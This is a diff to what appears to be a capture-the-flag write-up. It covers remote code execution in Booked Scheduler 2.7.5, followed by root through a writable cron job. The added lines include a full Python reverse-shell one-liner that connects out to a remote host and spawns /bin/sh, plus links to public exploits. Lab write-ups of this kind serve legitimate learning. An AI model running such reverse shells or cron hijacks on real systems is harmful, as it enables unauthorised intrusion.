@@ -58,6 +58,14 @@ A quick search online reveals that this version is vulnerable to RCE. Exploit [h
 I was able to get a shell by follwoing this [exploit](https://www.exploit-db.com/exploits/50594), but I could not move out of the directory...I think this is because I have a shell as www-data. 
 ![Results!](screenshots/10.png)
 
+I ended up following another example online for this exploit because I was unable to move out of the directory I originally got a shell in. I am not sure what is the reason for that, I assume it is the way I got a shell, but doing the exploit manually resolved this issue. I uploaded a php file that will allow rce and from there I will get a reverse shell by using the following command:
+<pre>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",21));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</pre>
+
+[Exploit tutorial](https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF)
+
+![Results!](screenshots/10.png)
+
+
 ### Flags
 
 
@@ -65,6 +73,13 @@ I was able to get a shell by follwoing this [exploit](https://www.exploit-db.com
 ![Results!](screenshots/4.png)
 
 #### Root flag
+To escalate my privileges, I found that there is a cron job running on this machine every 3 minutes and I have read,write,execute permissions on the file that is getting run. Based on this, I created a file on my personal machine with the same name and placed python code that will spawn me a shell. Next, I removed the original cron job file that was getting run with the one I created on my machine, then I setup a listener in another terminal to wait for the incoming connection.
+![Results!](screenshots/11.png)
+
+
+![Results!](screenshots/12.png)
+
+
 
 
 
